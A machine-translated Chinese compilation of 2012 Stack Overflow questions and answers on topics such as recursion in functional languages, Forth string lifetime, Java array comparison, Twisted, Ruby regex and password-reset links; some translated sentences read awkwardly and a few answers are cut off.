Scala 中的`@tailrec`注解是帮助您分析哪些函数是尾递归的工具。您声称“此函数是尾递归的”，然后编译器会告诉您您是否弄错了。与其他函数式语言相比，这在 Scala 中尤其重要，因为运行它的机器 JVM 不能很好地支持尾调用优化，因此在所有相同的情况下，不可能在 Scala 中进行尾调用优化它在其他功能语言中。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-09-30T15:24:22.633

***TL;DR**：递归用于处理无处不在的归纳定义*数据*。*

当您在更高级别的抽象上操作时，递归是自然的。函数式编程不仅仅是用函数编码；它是关于在更高级别的抽象上操作，您自然会使用函数。使用函数，从任何有意义的上下文中重用相同的函数（再次调用它）是很自然的。

世界是通过重复相似/相同的构建块来构建的。如果你把一块布料切成两半，你就有两块布料。数学归纳法是数学的核心。我们，人类，计数（如，*1,2,3...*）。根据定义/构造该事物的相同情况，任何[归纳定义*的事物*](http://en.wikipedia.org/wiki/Recursion_(computer_science)#Inductively_defined_data)（例如*{1} 中的数字是 {1*和*2}中的数字）都可以自然地由递归函数处理/分析。*

递归无处不在。无论如何，任何迭代循环都是变相的递归，因为当你重新进入那个循环时，你又重新进入*了同一个*循环（只是可能有不同的循环变量）。因此，这不像*发明*有关计算的新概念，更像是*发现*基础并使其*明确*。

* * *

因此，递归是自然的。我们只是写下一些关于我们的问题的定律，一些涉及我们正在定义的函数的方程，它们保留了一些不变量（假设函数是连贯定义的），用简化的术语重新指定问题，瞧！我们有解决方案。

一个例子，一个计算列表长度的函数（一种归纳定义的递归数据类型）。假设它已定义，并返回列表的长度，这并不奇怪。它必须遵守哪些法律？在问题的何种简化下保留了哪些不变量？

最直接的是将列表拆分为其头元素，其余部分 - 即列表的尾部（根据列表的定义/构造方式）。法律是，

```
length (x:xs) = 1 + length xs 
```

啊！但是空列表呢？一定是这样

```
length [] = 0 
```

那么我们如何编写这样的函数呢？……等等……我们已经写好了！（在 Haskell 中，如果你想知道，函数应用是通过并列表达的，括号仅用于分组，并且`(x:xs)`是一个列表，其中包含`x`第一个元素，`xs`其余元素）。

允许这种编程风格的语言所需要的只是它具有[TCO](http://en.wikipedia.org/wiki/Tail_call)（也许有点奢侈， [TRMCO](http://en.wikipedia.org/wiki/Tail_call#Tail_recursion_modulo_cons)），所以没有堆栈爆炸，我们已经准备好了。

* * *

另一件事是纯度 - 代码变量和/或数据结构（记录的字段等）的不变性。

这样做的作用是，除了让我们的大脑不必跟踪何时发生变化之外，它是否使时间在我们的代码中明确显示，而不是隐藏在我们“变化”的可变变量/数据中。*从现在开始*，我们只能在命令式代码中“改变”变量的值——过去我们不能很好地改变它的值，不是吗？

因此，我们最终得到了记录的更改历史列表，更改在代码中明确显示：而不是`x := x + 2`我们编写`let x2 = x1 + 2`. [它使](https://en.wikipedia.org/wiki/Static_single_assignment_form)推理代码[变得容易得多](https://en.wikipedia.org/wiki/Assignment_(computer_science)#Single_assignment)。

* * *

为了使用[TCO](http://en.wikipedia.org/wiki/Tail_call)`length`解决尾递归上下文中的不变性，请考虑在累加器参数范式下对上述函数的尾递归重写：

```
length xs = length2 0 xs              -- the invariant: 
length2 a []     = a                  --     1st arg plus
length2 a (x:xs) = length2 (a+1) xs   --     the length of 2nd arg 
```

这里的 TCO 意味着调用帧重用，除了直接跳转，因此调用链`length [1,2,3]`实际上可以看作是改变了调用堆栈帧对应于函数参数的条目：

```
length [1,2,3]
length2 0 [1,2,3]       -- a=0  (x:xs)=[1,2,3]
length2 1 [2,3]         -- a=1  (x:xs)=[2,3]
length2 2 [3]           -- a=2  (x:xs)=[3]
length2 3 []            -- a=3  (x:xs)=[]
3 
```

在纯语言中，没有任何值变异原语，表达变化的唯一方法是将更新的值作为参数传递*给函数*，以便进一步处理。如果进一步的处理与以前相同，那么自然我们必须为此调用相同的函数，将更新的值作为参数传递给它。这就是递归。

* * *

*以下是计算参数列表长度*的整个历史（如果需要，可以重用）：

```
length xs = last results
  where
     results = length3 0 xs
     length3 a []     = [a]
     length3 a (x:xs) = a : length3 (a+1) xs 
```

在 Haskell 中，这被称为受保护的递归或核心递归（至少我认为是这样）。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2012-09-30T08:49:52.800

递归没有什么“特别的”。它是编程和数学中广泛使用的工具，仅此而已。然而，函数式语言通常是极简主义的。它们确实引入了许多花哨的概念，如模式匹配、类型系统、列表理解等，但它只不过是非常通用和非常强大但简单和原始工具的语法糖。这些工具是：函数抽象和函数应用。这是有意识的选择，因为语言核心的简单性使得推理变得更加容易。它还使编写编译器更容易。用这种工具来描述循环的唯一方法是使用递归，因此命令式程序员可能会认为，函数式编程是关于递归的。它不是，`goto`声明，所以这是他们坚持的第一件事。

需要（可能是间接的）递归的另一点是处理递归定义的数据结构。最常见的例子是`list`ADT。在 FP 中，它通常是这样定义的`data List a = Nil | Branch a (List a)`。由于这里ADT的定义是递归的，它的处理函数也应该是递归的。同样，这里的递归并不特别：以递归方式处理此类 ADT 在命令式和函数式语言中看起来都很自然。好吧，在类似列表的 ADT 命令式循环的情况下，仍然可以采用，但在不同的树状结构的情况下，它们不能。

所以递归没有什么特别之处。它只是另一种类型的功能应用程序。然而，由于现代计算系统的限制（来自 C 语言中糟糕的设计决策，这是事实上的标准跨平台汇编程序）函数调用不能无限嵌套，即使它们是尾调用。正因为如此，函数式编程语言的设计者要么将允许的尾调用限制为尾递归 (scala)，要么使用复杂的技术，如践踏（旧 ghc 代码生成）或直接编译为 asm（现代 ghc 代码生成）。

TL;DR：FP 中的递归没有什么特别之处，至少在 IP 中没有什么特别之处，但是，由于 JVM 的限制，尾递归是 scala 中唯一允许的尾调用类型。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2012-09-30T08:33:01.190

我认为有两个属性对函数式编程至关重要：

1.  函数是第一类成员（仅相关，因为要使其有用，需要第二个属性）

2.  函数是纯函数，即使用相同参数调用的函数返回相同的值。

现在，如果您以命令式编程，则必须使用赋值。

考虑一个 for 循环。它有一个索引，并且在每次迭代中，索引都有不同的值。所以你可以定义一个返回这个索引的函数。如果您两次调用该函数，您可能会得到不同的结果。从而打破了第 2 条原则。

如果你违反了原则 2。传递函数（原则 1）会变得非常危险，因为现在函数的结果可能取决于函数被调用的时间和频率。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2012-09-30T16:54:53.543

避免副作用是函数式编程的支柱之一（另一个是使用高阶函数）。

想象一下如何在*不*依赖突变的情况下使用命令式流控制。可能吗？

当然`for (var i = 0; i < 10; i++) ...`取决于突变（`i++`）。事实上，任何条件循环结构都可以。在`while (something) ...`将`something`取决于一些可变状态。当然，`while (true) ...`不使用突变。但是，如果您想退出该循环，则需要一个`if (something) break`. 确实，尝试考虑一种（非无限）循环机制，而不是不依赖于突变的递归。

怎么样`for (var x in someCollection) ...`？现在我们离函数式编程越来越近了。`x`可以认为是循环体的参数*。*重用名称与重新分配值不同。也许在循环体中，您将值作为（无突变）`yield return`的表达式。`x`

完全等效地，您可以将`for`循环体移动到函数体中`foo (x) ...`，然后`someCollection`使用高阶函数将其映射到上面 - 将循环构造替换为`Map(foo, someCollection)`.

但是那么库函数是如何在`Map`没有变异的情况下实现的呢？好吧，当然使用递归！它已经为你完成了。一旦你开始使用第二个高阶函数来替换你的循环结构，就不再需要自己实现递归函数了。

此外，通过尾调用优化，递归定义等效于迭代过程。您可能还会喜欢这篇博文：http: [//blogs.msdn.com/b/ashleyf/archive/2010/02/06/recursion-is-the-new-iteration.aspx](http://blogs.msdn.com/b/ashleyf/archive/2010/02/06/recursion-is-the-new-iteration.aspx)

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-10-04T23:27:25.663

上次我使用函数式语言（Clojure）时，我什至从未想过使用递归。一切都可以作为一组事物来处理，对它应用一个函数来获得零件产品，对其应用另一个函数，直到达到最终结果。

递归只是处理通常必须处理的多个项目的一种方式，而且不一定是最清晰的方式，以处理任何 g

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-03-26T16:40:23.863

为了新的 FP 学习者，我想加我的 2 美分。正如一些答案中提到的，递归是他们利用不可变变量但为什么我们需要这样做？这是因为它可以轻松地在多个内核上并行运行程序，但我们为什么要这样做呢？我们不能在单核中运行它并像往常一样快乐吗？不，因为要处理的内容每天都在增加，而且 CPU 时钟周期不能比添加更多内核显着增加。在过去的十年中，消费类计算机的时钟速度一直在 2.7 ghz 到 3.0 ghz 左右，而芯片设计人员在安装越来越多的晶体管时遇到了问题。而且 FP 长期以来一直是他们的，但没有*

# memory-management - Forth 中 S" ..." 的寿命是多少？

> ID：12659584
> 
> 赞同：6
> 
> 时间：2012-09-30T07:42:55.313
> 
> 标签：memory-management, forth

我一直在尝试阅读此内容，但找不到任何提及。

根据标准，`S"`不能修改创建的字符串，从[Gforth](http://en.wikipedia.org/wiki/Gforth)中的一个简单实验可以看出，字符串的空间不是来自字典或填充区域：

```
hex 
here . 7F48AB3B8758  ok
pad . 7F48AB3B8808  ok
s" test" .s <2> 77FDD0 4  ok 
```

我可以期望该地址在多长时间内有效？

换句话说，如果我将这个地址（和计数）存储在一个变量中，我可以稍后在程序中引用它，还是需要将它移动到字典或堆中的单独位置？如果我不存储地址，我会泄漏内存吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-30T23:25:50.313

当编译到定义中时，字符串的生命周期就是定义的生命周期。`s"`通常仅在编译时使用。

并不是所有的 Forths 甚至都允许在解释时使用，`s"`而且 ANS 确实说，“这个词的解释语义是未定义的”。该行为至少是特定于您的特定 Forth 的。

您似乎正在使用 Gforth，它恰好为至少一个解释时间字符串保留了空间。Gforth 手册说，“......字符串只存在到下一次调用`s"`”。它继续说，“一些 Forth 系统保留多个这些字符串，但通常它们的寿命仍然有限。” （[第 3.24 节字符和字符串](http://downloads.qi-hardware.com/people/dvdkhlng/gforth.pdf)）。

我希望这会有所帮助！

# java - 关于数组的一些问题

> ID：12659593
> 
> 赞同：5
> 
> 时间：2012-09-30T07:43:58.290
> 
> 标签：java, arrays

我有两个关于 Java 数组的问题，希望你能抽出时间来帮助我。

**问题一：**

```
int[] intArray1 = { 1, 4, 2, 5, 6, 7, 2 };  
int[] intArray2 = { 1, 4, 2, 5, 6, 7, 2 };

intArray1.equals(intArray2); 
```

但它返回false？

**问题2：**

我运行这段代码：

```
int[] intArray1 = { 1, 4, 2, 5, 6, 7, 2 };  //2 is duplicated
Arrays.binarySearch(intArray1,2); 
```

它返回-2。

但是当我删除重复时：

```
int[] intArray3 = { 1, 4, 2, 5, 6, 7}; // nothing is duplicated
Arrays.binarySearch(intArray1,2); 
```

现在它返回 2，这是正确的。

我不知道数组中的二进制搜索如何处理导致-2的重复？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-30T07:51:49.450

关于问题 1：数组继承`equals()`from的默认实现，仅当两个对象相同时才`Object`返回。`true`您可以使用以下方法测试数组的内容是否相等：

```
Arrays.equals(intArray1, intArray2); 
```

关于问题 2：除非数组已排序，否则二进制搜索会返回不可预测的（并且通常是错误的）结果。它恰好适用于特定的未排序数组是巧合。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-30T07:50:28.093

在未排序的数组上调用 binarySearch 时，通常会得到奇怪的结果。它在[javadoc](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#binarySearch%28int%5b%5d,%20int%29)中是明确的：

> 使用二进制搜索算法在指定的整数数组中搜索指定的值。在进行此调用之前，必须对数组进行排序（如上面的 sort 方法）。如果未排序，则结果未定义。如果数组包含多个具有指定值的元素，则无法保证会找到哪一个。

应有的`equals`回报`false`：您创建了两个不同的数组，并`equals`告诉您这两个数组是不同的，尽管它们的内容相似。`Arrays.equals`实现您打算使用的结构比较。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-30T07:52:10.073

Java 中的数组对象不会覆盖该`equals()`方法。因此，您必须使用实用程序方法[`Arrays.equals()`](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#equals%28java.lang.Object%5b%5d,%20java.lang.Object%5b%5d%29)：

```
Arrays.equals(intArray1, intArray2); 
```

二进制搜索仅适用于[已排序的数组](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#sort%28int%5b%5d%29)：

```
Arrays.sort(intArray1); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-30T07:50:38.383

问题一：

在这种情况下，`equals`比较对象（即指针）而不是它们的内容。您已经创建了两个不同的对象并按预期`equals`返回。`false`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-30T07:54:26.023

**问题#1：**该`equals()`方法比较对象的引用，而不是引用中的内容。因此，对于您的情况，equals() 方法失败。一种比较方法是使用[Arrays.equals(int[] a, int[] a2)](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#equals%28int%5B%5D,%20int%5B%5D%29)。根据Javadoc：

> 如果两个指定的 Objects 数组彼此相等，则返回 true。如果两个数组包含相同数量的元素，并且两个数组中所有对应的元素对相等，则认为这两个数组相等。如果 (e1==null ? e2==null : e1.equals(e2))，则认为两个对象 e1 和 e2 相等。换句话说，如果两个数组以相同的顺序包含相同的元素，则它们是相等的。此外，如果两个数组引用都为空，则认为两个数组引用相等。

**问题 #2 ：来自**[binarySearch(int[] a, int key)](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#binarySearch%28int%5B%5D,%20int%29)的 Javadoc ：

> 使用二进制搜索算法在指定的整数数组中搜索指定的值。在进行此调用之前，必须对数组进行排序（如通过 sort(int[]) 方法）。**如果未排序，则结果未定义。如果数组包含多个具有指定值的元素，则无法保证会找到哪一个。**

因此，您需要一个已排序且没有重复的数组才能使此方法正常工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-30T08:37:40.027

**-**首先对 a 应用二分搜索`sorted array`，这就是异常行为的原因。

**-**其次，你应该使用方法`Arrays.equals():`

`Arrays.equals(intArray1, intArray2);`

# python - python扭曲框架中的dataReceived（）方法令人困惑的行为

> ID：12659603
> 
> 赞同：2
> 
> 时间：2012-09-30T07:46:14.023
> 
> 标签：python, twisted

我正在尝试学习 python 扭曲的互联网框架，但有一件事让我感到困惑。使用 telnet 进行的初始测试表明，`protocol.Protocol.dataReceived()`只要接收到数据，就会调用该方法。因此，如果我将其定义如下，它会在触发前等待 EOL：

```
def dataReceived(self, data):
    print "MyProtocol::dataReceived, (%s)" %(data) 
```

输出：

```
MyProtocol::dataReceived, (dgdfg
) 
```

但是，只要我添加了一行：

```
def dataReceived(self, data):
    print "MyProtocol::dataReceived, (%s)" %(data)
    self.transport.write(data) 
```

它为每个角色触发。

输出：

```
MyProtocol::dataReceived, (d)
MyProtocol::dataReceived, (g)
MyProtocol::dataReceived, (d)
MyProtocol::dataReceived, (f)
MyProtocol::dataReceived, (g)
MyProtocol::dataReceived, (
) 
```

关于这里发生了什么的任何想法？

工厂是`protocol.Factory`，协议是`protocol.Protocol`

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T09:26:09.200

行缓冲不会在`dataReceived`火灾 ( [docs](http://twistedmatrix.com/documents/12.2.0/api/twisted.internet.interfaces.IProtocol.html#dataReceived) ) 之前发生，因此不能保证您收到的内容是 EOL 分隔的。不过，这不太可能是您问题的根源，因为您发送的消息适合默认的读取块大小。您能否分享其余的代码？

`LineReceiver`您可以查看一个协议（ [docs](http://twistedmatrix.com/documents/12.2.0/api/twisted.protocols.basic.LineReceiver.html#setLineMode)）来为您处理行缓冲。这是一个例子：

```
from twisted.internet import reactor
from twisted.protocols import basic

class EchoLine(basic.LineReceiver):
    delimiter = '\n'  # default is '\r\n'

    def lineReceived(self, line):
        print("received: %s" % line)
        self.sendLine(line)

class EchoFactory(protocol.ServerFactory):
    protocol = EchoLine

reactor.listenTCP(port, EchoFactory())
reactor.run() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T12:12:27.820

您使用的客户端有时会在发送前进行行缓冲。也许您在两个客户端之间切换以获得缓冲行为的差异，或者您在客户端中切换了缓冲选项。

# ruby - 使用 Ruby 在字符串中插入空格

> ID：12659606
> 
> 赞同：5
> 
> 时间：2012-09-30T07:46:27.733
> 
> 标签：ruby, regex, string

使用 Ruby 在字符串中插入空格

例如：我有`"LoremIpsumDolorSitAmet"`，我想得到这个`"Lorem Ipsum Dolor Sit Amet"`

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-09-30T07:49:21.820

假设 Ruby 1.9：

```
result = subject.split(/(?<=[a-z])(?=[A-Z])/) 
```

这分为小写和大写 ASCII 字母。

改为插入空格：

```
result = subject.gsub(/(?<=[a-z])(?=[A-Z])/, ' ') 
```

看这里：

```
irb(main):001:0> "LoremIpsumDolorSitAmet".gsub(/(?<=[a-z])(?=[A-Z])/, ' ')
=> "Lorem Ipsum Dolor Sit Amet" 
```

如果可以有单个大写字母，则需要稍微更改正则表达式：

```
irb(main):003:0* "ThisIsAString".gsub(/(?<=[A-Za-z])(?=[A-Z])/, ' ')
=> "This Is A String" 
```

# javascript - 如何防止在 IE 的 contenteditable div 中将 a@b 转换为 mailto 链接

> ID：12659608
> 
> 赞同：1
> 
> 时间：2012-09-30T07:46:59.400
> 
> 标签：javascript, internet-explorer, contenteditable

我正在尝试使用 contenteditable div 制作一个小部件，当我们在@（比如@xxx）之后键入任何内容时，将触发 ajax 调用以返回匹配的“xxx”值的可能建议。如果我在 '@' 前面有一个空格，但如果在 '@' 前面没有空格（就像这样 - abc@xxx），这一切都很好，整个事情就变成了一个 mailto 链接。据我所知，这是 IE 的默认行为。

任何人都可以帮助我防止这种情况发生吗？非常感谢任何建议。

提前致谢！！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T11:13:40.390

有一个名为的命令标识符[`AutoUrlDetect`](http://msdn.microsoft.com/en-us/library/aa769893%28v=vs.85%29.aspx)，您可以使用它`document.execCommand()`来防止这种行为（以及所有链接的自动插入）。遗憾的是它只适用于 IE 9 及更高版本。

```
document.execCommand("AutoUrlDetect", false, false); 
```

演示：http: [//jsfiddle.net/3ELJD/1/](http://jsfiddle.net/3ELJD/1/)

# c# - 如何访问 FlipView 内 DataTemplate 内的 xaml 控件

> ID：12659609
> 
> 赞同：2
> 
> 时间：2012-09-30T07:47:06.973
> 
> 标签：c#, windows-8, windows-store-apps, winrt-xaml

我想访问 C# 代码中的“图像”元素。我知道我不能直接访问它，因为它在数据模板中。我已经尝试过视觉树，但仍然无法在代码中获取“图像”控制元素。

```
<FlipView
            x:Name="flipView"
            AutomationProperties.AutomationId="ItemsFlipView"
            AutomationProperties.Name="Item Details"
            TabIndex="1"
            Grid.RowSpan="2"
            ItemsSource="{Binding Source={StaticResource itemsViewSource}}" SelectionChanged="flipView_SelectionChanged">

            <FlipView.ItemContainerStyle>
                <Style TargetType="FlipViewItem">
                    <Setter Property="Margin" Value="0,137,0,0"/>
                </Style>
            </FlipView.ItemContainerStyle>

            <FlipView.ItemTemplate>
                <DataTemplate>

                    <!--
                        UserControl chosen as the templated item because it supports visual state management
                        Loaded/unloaded events explicitly subscribe to view state updates from the page
                    -->
                    <UserControl Loaded="StartLayoutUpdates" Unloaded="StopLayoutUpdates">
                        <ScrollViewer x:Name="scrollViewer" Style="{StaticResource HorizontalScrollViewerStyle}" Grid.Row="1">

                            <!-- Content is allowed to flow across as many columns as needed -->
                            <common:RichTextColumns x:Name="richTextColumns" Margin="117,0,117,47">
                                <RichTextBlock x:Name="richTextBlock" Width="560" Style="{StaticResource ItemRichTextStyle}" IsTextSelectionEnabled="False">
                                    <Paragraph>
                                        <Run FontSize="26.667" FontWeight="Light" Text="{Binding Title}"/>
                                        <LineBreak/>
                                        <LineBreak/>
                                        <Run FontWeight="Normal" Text="{Binding Subtitle}"/>
                                    </Paragraph>
                                    <Paragraph LineStackingStrategy="MaxHeight">
                                        <InlineUIContainer>
                                            <Image x:Name="image" MaxHeight="480" Margin="0,20,0,10" Stretch="Uniform" Source="{Binding Image}" AutomationProperties.Name="{Binding Title}"/>
                                        </InlineUIContainer>
                                    </Paragraph>                                  
                                </RichTextBlock>
                            </common:RichTextColumns>
                        </ScrollViewer>
                    </UserControl>
                </DataTemplate>
            </FlipView.ItemTemplate>
</FlipView> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-01T10:59:29.917

我已经尝试过，并且可以按照您的描述访问 FlipView DataTemplate 内部的控件。尝试以下方法，让我知道这是否有帮助。

```
public static IEnumerable<T> RecurseChildren<T>(DependencyObject root) where T : UIElement
{
    if (root is T)
    {
        yield return root as T;
    }

    if (root != null)
    {
        var count = VisualTreeHelper.GetChildrenCount(root);

        for (var idx = 0; idx < count; idx++)
        {
            foreach (var child in RecurseChildren<T>(VisualTreeHelper.GetChild(root, idx)))
            {
                yield return child;
            }
        }
    }
} 
```

访问图像控制：

```
var imageControl = RecurseChildren<Image>(rootVisual).FirstOrDefault(); 
```

这里 rootVisual 是我页面中的 Grid 实例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-08T18:32:43.807

在这里回答[https://stackoverflow.com/a/16446670/265706](https://stackoverflow.com/a/16446670/265706)

简短的回答是：您遇到的问题是 DataTemplate 正在重复并且内容是由他的 FlipView 生成的。名称没有公开，因为它会与生成的前一个兄弟姐妹（或将要生成的下一个兄弟姐妹）冲突。

因此，要在 DataTemplate 中获取命名元素，您必须首先获取生成的项目，然后在生成的项目中搜索所需的元素。请记住，XAML 中的逻辑树是您按名称访问事物的方式。生成的项目不在逻辑树中。相反，它们位于可视树中（所有控件都位于可视树中）。这意味着您必须在可视树中搜索要引用的控件。VisualTreeHelper 允许您执行此操作。

# javascript - 使用 ajax 将 JSON 发送到 Web 服务

> ID：12659611
> 
> 赞同：0
> 
> 时间：2012-09-30T07:48:02.633
> 
> 标签：javascript, ajax

我应该在以下代码中进行哪些修改，以便以 json 字符串的形式将多个值从表单发布到我的 Web 服务？

我试过这个 -

```
 <script>

    function ajaxRequest(){
        var  xmlhttp = new XMLHttpRequest();
             xmlhttp.onreadystatechange = function() {
              if(xmlhttp.readyState == 4){
                 alert(xmlhttp.readyState);
                }
                };
                var namevalue=encodeURIComponent(document.getElementById("name").value);
              //  var fname=encodeURIComponent(document.getElementById("lastname"));
                var parameters="name="+namevalue
                var url="http://localhost:41191/test/resources/postservice";
            xmlhttp.open("POST",url,true);
            xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
            xmlhttp.send(parameters)

   }
</script> 
```

还使用-

```
 function ajaxRequest(){
        var  xmlhttp = new XMLHttpRequest();
             xmlhttp.onreadystatechange = function() {
              if(xmlhttp.readyState == 4){
                 alert(xmlhttp.readyState);
                }
                };

var parameters = { "name": $('#name').val(), "firstname": $('#fname').val() };
                var url = 'http://localhost:41191/test/resources/storeincompleteform';
                xmlhttp.open('POST', url, true);
                xmlhttp.setRequestHeader('Content-type', 'application/json')
                xmlhttp.send(JSON.stringify(parameters)); }
 </script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:51:44.130

```
var parameters = { param1: 'value1', param2: 'value2' };
var url = 'http://localhost:41191/test/resources/postservice';
xmlhttp.open('POST', url, true);
xmlhttp.setRequestHeader('Content-type', 'application/json')
xmlhttp.send(JSON.stringify(parameters)); 
```

这将在 POST 请求正文中发送以下数据：

```
{"name":"value1","name2":"value2"} 
```

该`JSON.stringify`方法本机内置于现代浏览器中，但如果您想支持一些旧版浏览器，您可以参考[json2.js](https://github.com/douglascrockford/JSON-js)脚本。

# java-me - 在 Lwiit J2ME 中显示状态栏

> ID：12659615
> 
> 赞同：-1
> 
> 时间：2012-09-30T07:48:35.607
> 
> 标签：java-me, lwuit, statusbar, series-40

我在我的 J2ME 应用程序中使用 Lwiit S40，我想显示包含电池/时间的状态栏......在应用程序中，我试图将这行代码放在 Midlet

```
((Canvas)(javax.microedition.lcdui.Display.getDisplay(this).getCurrent())).setFullScreenMode(false); 
```

它可以工作，但底部出现 2 个菜单栏。我应该怎么做才能解决这个问题？![在此处输入图像描述](../Images/bfdb75b5b5767c2f45e4c8cc767f0e9b.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-14T13:21:02.553

在此模式下工作时，您应该使用本机命令。我自己不使用 S40 版本，所以我不知道这些人做了什么。但是，LWUIT 正确和 Codename One 具有将命令设置为本地命令的能力。

# ios6 - 从 CFStringRef 保存 NSString。弧

> ID：12659624
> 
> 赞同：1
> 
> 时间：2012-09-30T07:50:30.647
> 
> 标签：ios6, abaddressbook, core-foundation

我正在尝试保存`firstName`和`lastname`. `NSLog(firstName);`从地址簿打印正确的值，但`_dossier.firstName`为空。图像保存正确。

```
ABAddressBookRef addressBook = ABAddressBookCreate();

for (TKAddressBook *ab in contacts) {
    NSNumber *personID = [NSNumber numberWithInt:ab.recordID];
    ABRecordID abRecordID = (ABRecordID)[personID intValue];
    ABRecordRef abPerson = ABAddressBookGetPersonWithRecordID(addressBook, abRecordID);

    NSString* firstName = nil;
    NSString* lastName = nil;

    // Check person image
    UIImage *personImage = nil;
    if (abPerson != nil && ABPersonHasImageData(abPerson)) {

        firstName = (__bridge NSString*)ABRecordCopyValue(abPerson,
                                                          kABPersonFirstNameProperty);
        NSLog(firstName);
        lastName = (__bridge NSString*)ABRecordCopyValue(abPerson,
                                                         kABPersonLastNameProperty);

        CFDataRef contactThumbnailData = ABPersonCopyImageDataWithFormat(abPerson, kABPersonImageFormatThumbnail);
        personImage = [UIImage imageWithData:(__bridge NSData*)contactThumbnailData];
        CFRelease(contactThumbnailData);
        [_document.managedObjectContext performBlock:^() {
            Dossier *dossier = [NSEntityDescription insertNewObjectForEntityForName:@"Dossier"
                                                             inManagedObjectContext:_document.managedObjectContext];

            _dossier.firstName = firstName;
            _dossier.lastName = lastName;

            dossier.photo = personImage;
        }];

    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T14:43:50.777

在`performBlock`您分配的内部，`firstName`而不是新创建的对象。`lastName``_dossier``dossier`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:56:55.163

在这一行：

```
firstName = (__bridge NSString*)ABRecordCopyValue(abPerson,
        NSLog(firstName);                                                              kABPersonFirstNameProperty); 
```

你`NSLog`打断了陈述。除非格式以某种方式搞砸了非常糟糕。

# java - 忘记密码链接：如何验证链接？

> ID：12659625
> 
> 赞同：2
> 
> 时间：2012-09-30T07:50:35.937
> 
> 标签：java, web-applications, spring-security

> **可能重复：**
> [忘记密码：实现忘记密码功能的最佳方法是什么？](https://stackoverflow.com/questions/522967/forgot-password-what-is-the-best-method-of-implementing-a-forgot-password-funct)

我正在为 Web 应用程序实现忘记密码。用户将收到一封邮件，其中包含指向该网页的链接以输入新密码。我想将链接的有效期限制为自创建以来最多 24 小时。我应该如何实现这个？我应该如何生成此参数，以便不重复使用相同的链接或无法修改链接并重复使用它？

不确定这是否有帮助，但我使用的是 Spring 3.1 框架。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:56:20.203

对于此类功能，您需要创建一个基于时间戳的随机令牌并将其与忘记密码链接一起发送。您需要按照以下提到的步骤操作

1.  当用户忘记密码时创建一个随机令牌并将其保存在数据库中并具有到期时间。
2.  通过电子邮件将嵌入了令牌的链接发送给用户。
3.  当用户点击链接时，首先检查令牌过期时间，如果过期可以向用户显示消息。
4.  如果令牌未过期，则允许用户更改密码并可以将令牌状态设置为无效。

为了更安全，您可以创建更多步骤以确保链接来自有效用户并且未被黑客入侵。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:56:39.653

常见的方法是在您的 url 中包含生成的 id。该 id 将与提交的日期一起保存在 db 中，无论是创建日期还是过期时间。这样你就可以创建一个后台任务来清除你过期的 id。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:57:02.450

我会做的是：

*   重置用户密码（随机值），有效期为 now + 24h
*   向用户发送新密码，其中包含指向“更改密码”页面的链接

优点：

*   Spring Security 会处理过期问题
*   如果我“窃取”指向“更改密码”页面的链接，那将一文不值：用户需要输入当前密码和新密码（两次）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T07:57:53.343

1.  一旦用户请求新密码，生成一些随机令牌，例如使用[`RandomStringUtils.randomAlphanumeric(int)`](http://commons.apache.org/lang/api-2.3/org/apache/commons/lang/RandomStringUtils.randomAlphanumeric%28%29). 将此令牌存储在与请求密码重置的用户 ID 关联的数据库中。还存储创建时的时间戳。

2.  通过电子邮件向用户发送链接。此链接应包含您刚刚创建的令牌作为 URL 的一部分。

3.  用户进入此链接后，系统会要求她输入新密码。如果您担心链接可能会泄露，还请询问一些个人详细信息（电子邮件、名字等）

4.  在服务器端，您：

    1.  查找令牌和与该令牌关联的用户 ID

    2.  通过比较当前日期确保令牌仍然有效

    3.  存储散列的新密码

# xcode - 应用程序图标显示默认，而不是 IconSet

> ID：12659628
> 
> 赞同：1
> 
> 时间：2012-09-30T07:51:17.590
> 
> 标签：xcode, macos, icons

我有一个带有两个目标的应用程序即将发布，但当我在产品下选择应用程序时，我仍然在 Dock 和主窗口中看到带有纸、铅笔等的默认应用程序图标。

我有一个 icon.iconset 文件夹，其中包含 16、32、128、256、512 和 1024，均遵循 icon_XxX 和 icon_XxX@2x 命名；在 XCode 中的产品下，我看到了我的 16x16 图标。在目标的摘要选项卡下，show-in-finder 显示 iconset 文件夹确实是应用程序图标设置，plist 文件（无图标集扩展名）也是如此。一切似乎都很好，但我仍然在文档中看到默认图标。我使用的是 4.5，但我在 4.4.1 中遇到了同样的问题。图标是png。

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:04:45.460

